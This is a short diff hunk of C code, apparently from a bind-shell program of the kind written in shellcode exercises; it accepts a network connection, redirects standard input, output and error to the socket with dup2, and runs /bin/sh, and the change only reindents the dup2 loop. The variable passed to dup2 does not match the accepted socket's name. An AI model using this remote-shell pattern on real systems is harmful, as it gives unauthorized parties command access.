@@ -27,9 +27,9 @@ int main()
     // Accept incoming connection, don't store data, just use the sockfd created  
     client_sockid = accept(host_sockid, NULL, NULL);  
   
-	// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
-	for(i = 0; i <= 2; i++)
-		dup2(clientfd, i);
+    // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
+    for(i = 0; i <= 2; i++)
+	dup2(clientfd, i);
   
     // Execute /bin/sh  
     execve("/bin/sh", NULL, NULL);  
